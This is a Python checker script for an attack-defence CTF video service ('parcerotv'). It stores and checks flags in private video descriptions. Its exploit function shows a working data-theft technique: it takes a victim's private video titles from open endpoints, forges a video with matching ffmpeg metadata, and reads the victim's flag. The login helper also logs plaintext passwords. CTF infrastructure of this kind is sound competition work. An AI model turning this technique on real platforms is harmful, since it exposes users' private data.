from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import os
from httpx import AsyncClient, Response
from names import adjectives, content_types, cities, countries, german_proverbs
import ffmpeg
from bs4 import BeautifulSoup
import subprocess
from pathlib import Path
from requests_toolbelt.multipart.encoder import MultipartEncoder

from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 7777
checker = Enochecker("parcerotv", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

async def signup(client: AsyncClient, username: str, password:str, logger):
    logger.info(f"Starting signup process for user: {username}")
    signup_data = {"username": username,
                   "password": password}
    response = await client.post("/newuser", data=signup_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for signup process")
    if status_code in [200]:
        logger.info(f"user:{username} successfully registered")
    else:
        logger.error(f"Failed to sign up user, status_code: {status_code}")
        raise MumbleException(f"Failed to sign up user, status_code: {status_code}")

async def login(client: AsyncClient, username:str, password: str, logger):
    logger.info(f"Starting login process for user: {username} and password {password}")
    login_data = {"username": username,
                   "password": password}
    response = await client.post("/checkcredentials", data=login_data)
    logger.info(f"Response of /checkcredentials with status: {response.status_code} and with content {response.text}")
    status_code = response.status_code
    if status_code in [303]:
        logger.info(f"Successfull login of user {username} with redirection {status_code} ")
    else:
        logger.error(f"Failed Login of user {username} status code: {status_code}")
        raise MumbleException(f"Failed Login of user {username} with password: {password} should be Unauthozired {status_code}")

def generate_title() -> str:
    adj = random.choice(adjectives)
    content = random.choice(content_types)
    number = random.randint(1, 1000000)
    return f"{adj}-{content}-{number}"

def generate_location() -> str:
    country = random.choice(countries)
    city = random.choice(cities)
    return f"{country}, {city}"

def generate_description() -> str:
    return f"{random.choice(german_proverbs)} {random.randint(1, 10)}"

def generate_about() -> str:
    return "aasd"

def get_random_video_path(path="videos") -> str:
    video_extensions = {".mp4", ".mov", ".avi", ".mkv", ".webm", ".flv"}
    with os.scandir(path) as entries:
        videos = [entry.name for entry in entries
                  if entry.is_file() and os.path.splitext(entry.name)[1].lower() in video_extensions]
    if not videos:
        raise FileNotFoundError("No video files found in the directory.")
    return os.path.join(path, random.choice(videos))
    
def get_random_thumbnail_path(path="thumbnails") -> str:
    """Returns the full path to a random PNG thumbnail from the specified directory."""
    if not os.path.exists(path):
        raise FileNotFoundError(f"Directory '{path}' does not exist.")
    
    thumbnails = [
        f for f in os.listdir(path)
        if os.path.isfile(os.path.join(path, f)) and f.lower().endswith(".png")
    ]

    if not thumbnails:
        raise FileNotFoundError("No PNG thumbnails found in the directory.")

    return os.path.join(path, random.choice(thumbnails))
    

def create_video_with_metadata(creator: str, location, title,logger, is_exploit=False):
    """change metadata of video so it can be exploited later with ffmpeg"""
    if is_exploit:
        path = f'/tmp/exploit_{title}_{random.randint(1000,9999)}.mp4'
    else:
        path = f'/tmp/metadata_{title}_{random.randint(1000,9999)}.mp4'
    video_path = get_random_video_path()
    
    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator} saved at {path}, from the video \n {video_path}")
    
    cmd = [
        "ffmpeg",
        "-i", video_path,
        "-metadata", f"title={title}",
        "-metadata", f"artist={creator}",
        "-metadata", f"genre={location}",
        "-codec", "copy",  # Don't re-encode video
        path
    ]

    subprocess.run(cmd, check=True)
    # mp4_path = path.replace(".mkv", ".mp4")
    # os.rename(path, mp4_path)
    logger.info("Metdata_video build successfully")
    return path
  
    
async def upload_private_video(client: AsyncClient, description, location, title, logger, path)-> str:
   """Upload a private video, description is the flag store"""
   logger.info(f"uploading a private video")
   with open(path, "rb") as video_file, open(get_random_thumbnail_path(), "rb") as thumb:
    files = {
        "name": (None, title),
        "description": (None, description),
        "is_private": (None, "1"),
        "location": (None, location),
        "file": (Path(path).name, video_file, "video/mp4"),
        "thumbnail": ("thumbnail.png", thumb, "image/png"),
    }
    
    logger.info(f"Uploading file {Path(path).name}, from path {path}")
    response = await client.post("/app/create_video", files=files)
   
   status_code = response.status_code
   if status_code == 404:
        logger.info(f"Client error {status_code} with {response.text}")
   
   if status_code in [303]:
       logger.info(f"Video was succesfully uploaded")
       redirect_url = response.headers.get("Location")
       logger.info(f"Redirected to: {redirect_url}")
       return redirect_url 
   else:
       raise MumbleException(f"failed to upload video {title}, with location: {location}")


async def upload_public_video(client: AsyncClient, logger, title, description):
    video_path = get_random_video_path()
    thumbnail_path = get_random_thumbnail_path()
    with open(video_path, "rb") as video_file, open(thumbnail_path, "rb") as thumb:
        files = {
        "name": (None, title),
        "description": (None, description),
        "is_private": (None, "0"),
        "location": (None, generate_location()),
        "file": (Path(video_path).name, video_file, "video/mp4"),
        "thumbnail": ("thumbnail.png", thumb, "image/png"),
    }
        logger.info(f"Uploading public video {video_path}")
        response = await client.post("/app/create_video", files=files)
    status_code = response.status_code
    if status_code == 404:
        logger.info(f"Client error {status_code} with {response.text}")
   
    if status_code in [303]:
       logger.info(f"Video was succesfully uploaded")
       redirect_url = response.headers.get("Location")
       logger.info(f"Redirected to: {redirect_url}")
       return redirect_url 
    else:
       raise MumbleException(f"failed to upload public video {title}")
    
"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_video(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    logger.debug(f"Connecting to service")
    # Register a new user
    await signup(client,username, password,logger)
    # Login
    await login(client, username, password,logger)
    
    #Create Data for video
    title = generate_title()
    location = generate_location()
    description: str  = task.flag
    logger.debug(f"Creating video with right metadata for exploit")
    path = create_video_with_metadata(creator=username, location=location, title=title,logger=logger)
    logger.debug(f"Saving flag in video {title} location: {location}, description(flag): {description}")
    await upload_private_video(client, description, location, title, logger, path)
    

    #save flag and userdata
    await db.set("userdata", (username, password, title, description))

    return username

@checker.getflag(0)
async def getflag_video(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient
) -> None:
    try:
        username, password,title, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    logger.debug(f"getflag(0) for the user {username} and video {title} flag should be {description}")
    await login(client, username, password,logger)

    logger.info(f"try to access flag in /app/myprofile")
    response = await client.get("/get_my_videos")
    logger.debug("response.text is: " + response.text)
    assert_in(task.flag, response.text, "Flag missing")
        

@checker.putnoise(0)
async def putnoise_video(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    logger
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    logger.debug(f"Connecting to service")
    # Register a new user
    await signup(client,username, password,logger)
    # Login
    await login(client, username, password,logger)

    #Create Data for video
    title = generate_title()
    description = generate_description()
    await upload_public_video(client, logger, title, description)
    
    await db.set('information', (username, password, title, description))
   

@checker.getnoise(0)
async def getnoise_video(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    logger.info(f"Getnoise 0 (video) {client.base_url}")
    try:
        username, password, title, description = await db.get('information')
    except:
        logger.error("Putnoise 0 (video) failed : DB couldnt get information")
        raise MumbleException('Putnoise(0) failed')
    
    await login(client, username, password, logger)
    response = await client.get("/get_my_videos")
    logger.debug("response.text is: " + response.text)
    assert_in(description, response.text, "Flag missing")
    
    
@checker.putnoise(1)
async def putnoise_profile_description(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    logger.debug(f"Connecting to service")
    # Register a new user
    await signup(client,username, password,logger)
    # Login
    await login(client, username, password,logger)
    
    about = {"about":generate_about()}
    
    response = await client.post("/update_about", data=about)
    
    if response.status_code != 303:
        logger.error(f"/update about should return 303 but returned {response.status_code}")
        raise MumbleException("/update_about didn't work")
    
    await db.set('information1', (username, password, about))
    

@checker.getnoise(1)
async def getnoise_profile_description(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    logger.info(f"Getnoise 1 (description) {client.base_url}")
    try:
        username, password, about = await db.get('information1')
    except:
        logger.error("Putnoise 1 (description) failed : DB couldnt get information")
        raise MumbleException('Putnoise(1) failed')
    
    await login(client, username, password, logger)
    
    response = await client.get("get_my_profile")
    if response.status_code != 200:
        raise MumbleException()
    
    json = response.json()
    logger.info(f"Json Response about is {json} {response}")
    about_in_response = json.get("about")
    
    if about_in_response != about.get("about"):
        raise MumbleException(f"About in profile and about that was saved are different {about} != {about_in_response}")
    
    logger.info("getnoise(1) (description) worked fine")
    
    
    

    

@checker.havoc(0)
async def havoc_failed_login(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient):
    pass
@checker.havoc(1)
async def havoc_get_logo(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient):
    pass

@checker.havoc(2)
async def havoc_get_video(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient):
    pass

@checker.exploit(0)
async def exploit_video(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
    username_attacker: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password_attacker: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    
    await signup(client, username_attacker, password_attacker, logger)
    await login(client, username_attacker, password_attacker, logger)
    
    
    logger.info(f"Exploiting {task.attack_info} ")
    username = task.attack_info
    response = await client.get(f"/get_user_info_with_name/{username}")
    if response.status_code != 200:
        raise MumbleException()
    json = response.json()
    logger.info(f"json is {json}")
    id = json.get("id")
    logger.info(f"/get_private_videos/{id}")
    private_video_response = await client.get(f"/get_private_videos/{id}")
    videos = private_video_response.json()
    video = videos[0]
    title = video.get("name")
    location = video.get("location")
    
    path = create_video_with_metadata(username, location, title,logger, is_exploit=True)
    await upload_private_video(client, "ist egal", "Berlin", title,logger, path)
    
    my_vid_response = await client.get("/get_my_videos")
    if my_vid_response.status_code != 200:
        raise MumbleException()
    videos = my_vid_response.json()
    logger.info(f"Videos are {videos}")
    for video in videos:
        logger.info(f"video {video}")
        if video.get("name") == title:
            video_path = video.get("path")
            break
    
    logger.info(f"/get_video_info/{video_path}")
    video_response = await client.get(f"/get_video_info/{video_path}")
    if video_response.status_code != 200:
        raise MumbleException()
    video_exploited = video_response.json()
    logger.info(f"Exploited video json: {video_exploited}")
    if flag := searcher.search_flag(video_exploited.get("description")):
        return flag
    raise MumbleException("flag not found")



if __name__ == "__main__":
    checker.run()